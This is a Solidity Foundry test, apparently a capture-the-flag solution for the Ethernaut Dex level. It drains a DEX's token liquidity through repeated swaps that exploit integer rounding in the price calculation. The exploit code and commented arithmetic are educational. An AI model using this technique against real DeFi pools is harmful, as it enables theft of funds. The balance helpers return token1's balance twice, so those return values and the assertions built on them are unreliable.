// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import '../../src/EthernautCTF/Dex.sol';
import '@openzeppelin-08/utils/math/Math.sol';
import '@forge-std/Test.sol';
import '@forge-std/console2.sol';

contract DexExploit is Test {
  Dex target;
  address deployer = makeAddr('deployer');
  address exploiter = makeAddr('exploiter');
  SwappableToken token1;
  SwappableToken token2;

  function setUp() public {
    vm.startPrank(deployer);
    target = new Dex();
    console2.log('DEX contract deployed');

    token1 = new SwappableToken(address(target), 'TOKEN1', 'T1', 10_000);
    token2 = new SwappableToken(address(target), 'TOKEN2', 'T2', 10_000);
    target.setTokens(address(token1), address(token2));
    console2.log('Tokens deployed and set in the DEX');

    target.approve(address(target), 100);
    target.addLiquidity(address(token1), 100);
    target.addLiquidity(address(token2), 100);
    console2.log('Liquidity added to the DEX contract');

    token1.transfer(address(exploiter), 10);
    token2.transfer(address(exploiter), 10);
    console2.log('Tokens sent to the exploiter');
    vm.stopPrank();
  }

  function testExploit() public {
    // Balance check.
    (uint256 dexToken1Balance, uint256 dexToken2Balance) = getDexBalances();
    assertEq(dexToken1Balance, 100);
    assertEq(dexToken2Balance, 100);

    // Perform the exploit.
    // The goal is to drain at least one of the two tokens of the DEX contract.
    // The method `getSwapPrice` computes the price using a division but there are no floating
    // points in Solidity. The result will be rounded off towards zero, leading to a precision loss.
    // We can call the function repeatedly by swapping TOKEN1 for TOKEN2 and vice-versa until one
    // of the token balance is fully drained.

    // At the start, the DEX has 100 TOKEN1 and 100 TOKEN2.
    // Let's say we swap all of our TOKEN1 tokens (10) for TOKEN2.
    // Then we get 10 * 100 / 100 = 10 TOKEN2.
    // Thus, the DEX now has 110 TOKEN1 and 90 TOKEN2.
    // We now have 0 TOKEN1 and 20 TOKEN2.

    // Let's repeat the same operation.
    // Swap all of our TOKEN2 tokens (20) for TOKEN1.
    // Then we get 20 * 110 / 90 = 24.4 TOKEN2 (rounded to 24).
    // Thus, the DEX now has 86 TOKEN1 and 110 TOKEN2.
    // We now have 24 TOKEN1 and 0 TOKEN2.
    // We managed to get 4 more tokens!

    // One more time...
    // Swap all of our TOKEN1 tokens (24) for TOKEN2.
    // Then we get 24 * 110 / 86 = 30.69 TOKEN2 (rounded to 30).
    // We now have 0 TOKEN1 and 30 TOKEN2.
    // We managed to get 10 more tokens!

    // We then repeat the same process again and again until one of the tokens is fully drained.
    vm.startPrank(exploiter);
    target.approve(address(target), 1_000_000);

    (
      uint256 token1AmountToSwap,
      uint256 token2AmountToSwap
    ) = getExploiterBalances();
    while (token1AmountToSwap > 0 || token2AmountToSwap > 0) {
      dexToken1Balance = target.balanceOf(address(token1), address(target));
      uint256 exploiterToken1Balance = target.balanceOf(
        address(token1),
        exploiter
      );
      token1AmountToSwap = Math.min(dexToken1Balance, exploiterToken1Balance);
      if (token1AmountToSwap != 0) {
        target.swap(address(token1), address(token2), token1AmountToSwap);
        console2.log(''); // break line
        console2.log('Swapped %d TOKEN1 for TOKEN2', token1AmountToSwap);
        getDexBalances();
        getExploiterBalances();
      }

      dexToken2Balance = target.balanceOf(address(token2), address(target));
      uint256 exploiterToken2Balance = target.balanceOf(
        address(token2),
        exploiter
      );
      token2AmountToSwap = Math.min(dexToken2Balance, exploiterToken2Balance);
      if (token2AmountToSwap != 0) {
        target.swap(address(token2), address(token1), token2AmountToSwap);
        console2.log(''); // break line
        console2.log('Swapped %d TOKEN2 for TOKEN1', token2AmountToSwap);
        getDexBalances();
        getExploiterBalances();
      }
    }

    // Check that the exploit worked.
    (dexToken1Balance, dexToken2Balance) = getDexBalances();
    assertTrue(dexToken1Balance == 0 || dexToken2Balance == 0);
    console2.log(''); // break line
    console2.log('At least one of the tokens was drained in the DEX contract');
    getDexBalances();
    getExploiterBalances();

    vm.stopPrank();
  }

  function getDexBalances() public view returns (uint256, uint256) {
    (uint256 token1Balance, uint256 token2Balance) = getBalances(
      address(target)
    );
    console2.log(
      'Checking DEX balances: TOKEN1=%d TOKEN2=%d',
      token1Balance,
      token2Balance
    );
    return (token1Balance, token1Balance);
  }

  function getExploiterBalances() public view returns (uint256, uint256) {
    (uint256 token1Balance, uint256 token2Balance) = getBalances(exploiter);
    console2.log(
      'Checking exploiter balances: TOKEN1=%d TOKEN2=%d',
      token1Balance,
      token2Balance
    );
    return (token1Balance, token1Balance);
  }

  function getBalances(
    address _address
  ) public view returns (uint256, uint256) {
    uint256 token1Balance = token1.balanceOf(_address);
    uint256 token2Balance = token2.balanceOf(_address);
    return (token1Balance, token2Balance);
  }
}
